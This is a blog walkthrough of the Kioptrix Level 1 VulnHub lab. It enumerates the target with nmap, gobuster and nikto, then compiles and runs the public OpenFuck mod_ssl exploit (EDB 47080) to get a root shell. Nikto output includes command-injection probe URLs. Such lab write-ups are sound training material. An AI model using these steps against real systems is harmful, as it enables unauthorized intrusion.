---
layout: post
title:  "Kioptrix Level One"
date:   2020-06-22
categories: blog
tags:   [hacking, Kioptrix]
---
### Kioptrix Level One
Download: [VulnHub][1]  
**NOTE:** Always exercise caution when downloading VMs of this nature (or anything for that matter) 
from the internet. VulnHub offers some guidance around protecting yourself and your home network, 
and there are other resources out there to help as well. I have provided the link to VulnHub only 
as a reference, and cannot be held liable for what you download.

First, we need to know what this computer is doing. My tool of choice for enumeration should come 
as no surprise: ```nmap```. Omitted output is noted with an ellipsis (...).
```
sudo nmap -vv -sV -sC -O 10.0.100.25
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 11:29 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
...
Initiating SYN Stealth Scan at 11:29
Scanning 10.0.100.25 [1000 ports]
Discovered open port 443/tcp on 10.0.100.25
Discovered open port 80/tcp on 10.0.100.25
Discovered open port 22/tcp on 10.0.100.25
Discovered open port 111/tcp on 10.0.100.25
Discovered open port 139/tcp on 10.0.100.25
Discovered open port 1024/tcp on 10.0.100.25
Completed SYN Stealth Scan at 11:29, 0.11s elapsed (1000 total ports)
Initiating Service scan at 11:29
Scanning 6 services on 10.0.100.25
Completed Service scan at 11:29, 14.02s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 10.0.100.25
NSE: Script scanning 10.0.100.25.
...
Nmap scan report for 10.0.100.25
Host is up, received arp-response (0.00059s latency).
Scanned at 2020-06-15 11:29:01 EDT for 126s
Not shown: 994 closed ports
Reason: 994 resets
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   ...
|_sshv1: Server supports SSHv1
80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2020-06-15T15:32:33+00:00; +2m25s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|_    ...
1024/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
MAC Address: 00:0C:29:96:9E:D3 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
TCP/IP fingerprint:
...

Uptime guess: 0.003 days (since Mon Jun 15 11:26:06 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=196 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 2m24s
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1e>          Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 54030/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 45873/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45740/udp): CLEAN (Failed to receive data)
|   Check 4 (port 62833/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
...
Nmap done: 1 IP address (1 host up) scanned in 127.97 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.362KB)
```

Now that we know what the computer is doing, we can have a peek at some of the services. The ones 
that got my attention were:
```
80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
```

My nature is to always start with the website. In this case, it only appears to be the generic 
Apache web server home page. Starting with the easy stuff:
- robots.txt:   404 error
- .htaccess:    403 error
- .htpasswd:    403 error
  
  
Those more familiar with known exploits might have already noticed something in the nmap output 
that I was not keyed into just yet. So my next course of action is to begin scanning web 
directories to see if there is a hidden web page. For this, I turn to ```gobuster```:
```
gobuster dir -u http://10.0.100.25 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.100.25
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/15 11:55:59 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/~operator (Status: 403)
/~root (Status: 403)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
/manual (Status: 301)
/mrtg (Status: 301)
/usage (Status: 301)
===============================================================
2020/06/15 11:56:00 Finished
===============================================================
```

Manual enumeration of the web pages showed that '/mrtg' led to the documentation for MRTG and 
'/usage' led to a simple page with usage statistics. Of more significance was the '/manual' page, 
which led to a directory listing with a 'mod' sub folder. This included some additional 
documentation, including the documentation on mod_ssl.

Without to much else to go on, I turn to ```nikto```:
```
nikto -host 10.0.100.25
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.100.25
+ Target Hostname:    10.0.100.25
+ Target Port:        80
+ Start Time:         2020-06-15 13:53:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8698 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2020-06-15 13:54:19 (GMT-4) (23 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

I tested out some of the "PHP backdoor" pages, but was not able to find any of them. Not sure what 
led to this false positive, but I moved on to another finding in the Nikto output that looked 
pretty interesting:
```
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
```

Had I been more familiar with web testing, I might have noticed this right away from the nmap scan 
I ran earlier, but Nikto gave me the push I needed to get there. From there I head over to Exploit 
DB to find EDB-ID: [47080][2] _(NSFW: Language)_. Based on the comments, I need to be sure to 
install 'libssl-dev' from the repositories and then compile the code:
```
sudo apt install libssl-dev
...
gcc -o mod_ssl_exploit 47080.c -lcrypto
```

To keep things clear on my Kali VM, I usually name the exploits after their EDB-ID number. Once 
compiled, running the program without any parameters prints a friendly usage text:
```
./mod_ssl_exploit 

*******************************************************************
* OpenF*ck v3.0.4-root priv8 by SPABAM based on openssl-too-open  *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./mod_ssl_exploit target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
        ...
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
        ...

F*ck to all guys who like use lamah ddos. Read SRC to have no surprise
```
Based on the output from nmap earlier, we're looking at RedHat and Apache 1.3.20. Here goes nothin:
```
./mod_ssl_exploit 0x6a 10.0.100.25 443 -c 40-50
```
No dice...next!
```
./mod_ssl_exploit 0x6b 10.0.100.25 443 -c 40-50
```
Great success, and in proper poor configuration fashion Apache is running as root!
![Glorious, glorious root shell!](/assets/images/kioptrix-mod_ssl-exploit.png)


[1]: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
[2]: https://www.exploit-db.com/exploits/47080